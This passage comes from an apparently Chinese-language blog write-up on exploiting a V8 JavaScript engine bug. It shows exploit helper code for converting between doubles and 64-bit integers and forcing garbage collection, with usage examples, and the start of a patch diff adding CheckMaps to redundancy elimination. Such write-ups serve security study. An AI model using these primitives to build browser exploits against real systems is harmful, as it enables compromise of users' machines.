avoid unecessary heap allocations during pack/unpack operations.</span></span><br><span class="line">    <span class="keyword">var</span> buffer      = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">var</span> byteView    = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line">    <span class="keyword">var</span> uint32View  = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line">    <span class="keyword">var</span> float64View = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        pack: <span class="function"><span class="keyword">function</span>(<span class="params">type, value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span><br><span class="line">            view[<span class="number">0</span>] = value;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, type.BYTES_PER_ELEMENT);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        unpack: <span class="function"><span class="keyword">function</span>(<span class="params">type, bytes</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Invalid bytearray"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span><br><span class="line">            byteView.set(bytes);</span><br><span class="line">            <span class="keyword">return</span> view[<span class="number">0</span>];</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Available types.</span></span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Int64</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// The underlying byte array.</span></span><br><span class="line">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">typeof</span> v) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'number'</span>:</span><br><span class="line">            v = <span class="string">'0x'</span> + <span class="built_in">Math</span>.floor(v).toString(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'string'</span>:</span><br><span class="line">            <span class="keyword">if</span> (v.startsWith(<span class="string">'0x'</span>))</span><br><span class="line">                v = v.substr(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> (v.length % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">                v = <span class="string">'0'</span> + v;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> bigEndian = unhexlify(v, <span class="number">8</span>);</span><br><span class="line">            <span class="comment">//print(bigEndian.toString());</span></span><br><span class="line">            bytes.set(<span class="built_in">Array</span>.from(bigEndian).reverse());</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'object'</span>:</span><br><span class="line">            <span class="keyword">if</span> (v <span class="keyword">instanceof</span> Int64) &#123;</span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (v.length != <span class="number">8</span>)</span><br><span class="line">                    <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Array must have excactly 8 elements."</span>);</span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'undefined'</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Int64 constructor requires an argument."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a double whith the same underlying bit representation.</span></span><br><span class="line">    <span class="keyword">this</span>.asDouble = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Check for NaN</span></span><br><span class="line">        <span class="keyword">if</span> (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; (bytes[<span class="number">6</span>] == <span class="number">0xff</span> || bytes[<span class="number">6</span>] == <span class="number">0xfe</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a double"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a javascript value with the same underlying bit representation.</span></span><br><span class="line">    <span class="comment">// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span></span><br><span class="line">    <span class="comment">// due to double conversion constraints.</span></span><br><span class="line">    <span class="keyword">this</span>.asJSValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((bytes[<span class="number">7</span>] == <span class="number">0</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0</span>) || (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a JSValue"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.</span></span><br><span class="line">        <span class="keyword">this</span>.assignSub(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span><br><span class="line">        <span class="keyword">var</span> res = Struct.unpack(Struct.float64, bytes);</span><br><span class="line">        <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the underlying bytes of this number as array.</span></span><br><span class="line">    <span class="keyword">this</span>.bytes = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>.from(bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the byte at the given index.</span></span><br><span class="line">    <span class="keyword">this</span>.byteAt = <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bytes[i];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the value of this number as unsigned hex string.</span></span><br><span class="line">    <span class="keyword">this</span>.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//print("toString");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'0x'</span> + hexlify(<span class="built_in">Array</span>.from(bytes).reverse());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Basic arithmetic.</span></span><br><span class="line">    <span class="comment">// These functions assign the result of the computation to their 'this' object.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decorator for Int64 instance operations. Takes care</span></span><br><span class="line">    <span class="comment">// of converting arguments to Int64 instances if required.</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params">f, nargs</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">arguments</span>.length != nargs)</span><br><span class="line">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Not enough arguments for function "</span> + f.name);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">                <span class="keyword">if</span> (!(<span class="built_in">arguments</span>[i] <span class="keyword">instanceof</span> Int64))</span><br><span class="line">                    <span class="built_in">arguments</span>[i] = <span class="keyword">new</span> Int64(<span class="built_in">arguments</span>[i]);</span><br><span class="line">            <span class="keyword">return</span> f.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = -n (two's complement)</span></span><br><span class="line">    <span class="keyword">this</span>.assignNeg = operation(<span class="function"><span class="keyword">function</span> <span class="title">neg</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">            bytes[i] = ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, Int64.One);</span><br><span class="line">    &#125;, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a + b</span></span><br><span class="line">    <span class="keyword">this</span>.assignAdd = operation(<span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> cur = a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">            carry = cur &gt; <span class="number">0xff</span> | <span class="number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a - b</span></span><br><span class="line">    <span class="keyword">this</span>.assignSub = operation(<span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> cur = a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">            carry = cur &lt; <span class="number">0</span> | <span class="number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a &amp; b</span></span><br><span class="line">    <span class="keyword">this</span>.assignAnd = operation(<span class="function"><span class="keyword">function</span> <span class="title">and</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            bytes[i] = a.byteAt(i) &amp; b.byteAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new Int64 instance with the same bit representation as the provided double.</span></span><br><span class="line">Int64.fromDouble = <span class="function"><span class="keyword">function</span>(<span class="params">d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> bytes = Struct.pack(Struct.float64, d);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Int64(bytes);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Convenience functions. These allocate a new Int64 to hold the result.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Return -n (two's complement)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Neg</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignNeg(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a + b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAdd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a - b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignSub(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a &amp; b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">And</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAnd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">"0xUNDEFINED"</span>;</span><br><span class="line">    <span class="keyword">var</span> ret = a.toString(<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret.substr(<span class="number">0</span>,<span class="number">2</span>) != <span class="string">"0x"</span>) <span class="keyword">return</span> <span class="string">"0x"</span>+ret;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lower</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the lower 32bit of double x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upper</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the upper 32bit of double x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lowerint</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the lower 32bit of int x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upperint</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the upper 32bit of int x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">combine</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//print(a.toString());</span></span><br><span class="line">    <span class="comment">//print(b.toString());</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//padLeft用于字符串左补位</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">combineint</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(b.toString(<span class="number">16</span>).substr(<span class="number">-8</span>,<span class="number">8</span>) + (a.toString(<span class="number">16</span>)).padLeft(<span class="number">8</span>), <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// based on Long.js by dcodeIO</span></span><br><span class="line">  <span class="comment">// https://github.com/dcodeIO/Long.js</span></span><br><span class="line">  <span class="comment">// License Apache 2</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">_u64</span> </span>&#123;</span><br><span class="line">     <span class="keyword">constructor</span>(hi, lo) &#123;</span><br><span class="line">        <span class="keyword">this</span>.lo_ = lo;</span><br><span class="line">        <span class="keyword">this</span>.hi_ = hi;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     hex() &#123;</span><br><span class="line">        <span class="keyword">var</span> hlo = (<span class="keyword">this</span>.lo_ &lt; <span class="number">0</span> ? (<span class="number">0xFFFFFFFF</span> + <span class="keyword">this</span>.lo_ + <span class="number">1</span>) : <span class="keyword">this</span>.lo_).toString(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">var</span> hhi = (<span class="keyword">this</span>.hi_ &lt; <span class="number">0</span> ? (<span class="number">0xFFFFFFFF</span> + <span class="keyword">this</span>.hi_ + <span class="number">1</span>) : <span class="keyword">this</span>.hi_).toString(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(hlo.substr(<span class="number">0</span>,<span class="number">2</span>) == <span class="string">"0x"</span>) hlo = hlo.substr(<span class="number">2</span>,hlo.length);</span><br><span class="line">        <span class="keyword">if</span>(hhi.substr(<span class="number">0</span>,<span class="number">2</span>) == <span class="string">"0x"</span>) hhi = hhi.substr(<span class="number">2</span>,hji.length);</span><br><span class="line">        hlo = <span class="string">"00000000"</span> + hlo</span><br><span class="line">        hlo = hlo.substr(hlo.length<span class="number">-8</span>, hlo.length);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0x"</span> + hhi + hlo;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     isZero() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.hi_ == <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.lo_ == <span class="number">0</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     equals(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.hi_ == val.hi_ &amp;&amp; <span class="keyword">this</span>.lo_ == val.lo_;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     and(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(<span class="keyword">this</span>.hi_ &amp; val.hi_, <span class="keyword">this</span>.lo_ &amp; val.lo_);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     add(val) &#123;</span><br><span class="line">        <span class="keyword">var</span> a48 = <span class="keyword">this</span>.hi_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> a32 = <span class="keyword">this</span>.hi_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> a16 = <span class="keyword">this</span>.lo_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> a00 = <span class="keyword">this</span>.lo_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">var</span> b48 = val.hi_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> b32 = val.hi_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> b16 = val.lo_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> b00 = val.lo_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">var</span> c48 = <span class="number">0</span>, c32 = <span class="number">0</span>, c16 = <span class="number">0</span>, c00 = <span class="number">0</span>;</span><br><span class="line">        c00 += a00 + b00;</span><br><span class="line">        c16 += c00 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c00 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c16 += a16 + b16;</span><br><span class="line">        c32 += c16 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c16 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c32 += a32 + b32;</span><br><span class="line">        c48 += c32 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c32 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c48 += a48 + b48;</span><br><span class="line">        c48 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64((c48 &lt;&lt; <span class="number">16</span>) | c32, (c16 &lt;&lt; <span class="number">16</span>) | c00);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     addi(h,l) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.add(<span class="keyword">new</span> _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     subi(h,l) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sub(<span class="keyword">new</span> _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     not() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(~<span class="keyword">this</span>.hi_, ~<span class="keyword">this</span>.lo_)</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     neg() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.not().add(<span class="keyword">new</span> _u64(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     sub(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.add(val.neg());</span><br><span class="line">     &#125;;</span><br><span class="line">  </span><br><span class="line">     swap32(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((val &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>) | ((val &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">              ((val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) | ((val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">     &#125;</span><br><span class="line">  </span><br><span class="line">     bswap() &#123;</span><br><span class="line">        <span class="keyword">var</span> lo = swap32(<span class="keyword">this</span>.lo_);</span><br><span class="line">        <span class="keyword">var</span> hi = swap32(<span class="keyword">this</span>.hi_);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(lo, hi);</span><br><span class="line">     &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">var</span> u64 = <span class="function"><span class="keyword">function</span>(<span class="params">hi, lo</span>) </span>&#123; <span class="keyword">return</span> <span class="keyword">new</span> _u64(hi,lo) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在这次exp编写中，用到的主要是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Int64.fromDouble(double num);</span><br><span class="line"><span class="keyword">new</span> Int64(int num).asDouble();</span><br></pre></td></tr></table></figure></p><ul><li><p><code>Int64.fromDouble(double num)</code><br>Constructs a new Int64 instance with the same bit representation as the provided double.<br>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(Int64.fromDouble(1.1));</span><br><span class="line">print(typeof(Int64.fromDouble(1.1)));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x3ff199999999999a</span><br><span class="line">object</span><br></pre></td></tr></table></figure></li><li><p><code>new Int64(int num).asDouble();</code><br>Return a double whith the same underlying bit representation.<br>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(new Int64(0x3ff199999999999a).asDouble());</span><br><span class="line">print(typeof(new Int64(0x3ff199999999999a).asDouble()));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">1.1000000000000227</span><br><span class="line">number</span><br></pre></td></tr></table></figure></li></ul><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc</span><br><span class="line">index <span class="number">3</span>a40e8d..cb51acc <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/redundancy-elimination.cc</span><br><span class="line">+++ b/src/compiler/redundancy-elimination.cc</span><br><span class="line">@@ <span class="number">-5</span>,<span class="number">6</span> +<span class="number">5</span>,<span class="number">8</span> @@</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/redundancy-elimination.h"</span></span></span><br><span class="line"> </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/node-properties.h"</span></span></span><br><span class="line">+<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/simplified-operator.h"</span></span></span><br><span class="line">+<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/objects-inl.h"</span></span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"> <span class="keyword">namespace</span> internal &#123;</span><br><span class="line">@@ <span class="number">-23</span>,<span class="number">6</span> +<span class="number">25</span>,<span class="number">7</span> @@ Reduction RedundancyElimination::Reduce(Node* node) &#123;</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckHeapObject:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckIf:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckInternalizedString:</span><br><span class="line">+    <span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckNumber:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckReceiver:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckSmi:</span><br><span class="line">@@ <span class="number">-129</span>,<span class="number">6</span> +<span class="number">132</span>,<span class="number">14</span> @@ <span class="function"><span class="keyword">bool</span> <span class="title">IsCompatibleCheck</span><span class="params">(Node <span class="keyword">const</span>* a, Node <span class="keyword">const</span>* b)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckInternalizedString &amp;&amp;</span><br><span class="line">         b-&gt;opcode() == IrOpcode::kCheckString) &#123;</span><br><span class="line">       <span class="comment">// CheckInternalizedString(node) implies CheckString(node)</span></span><br><span class="line">+    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span><br><span class="line">+               b-&gt;opcode() == 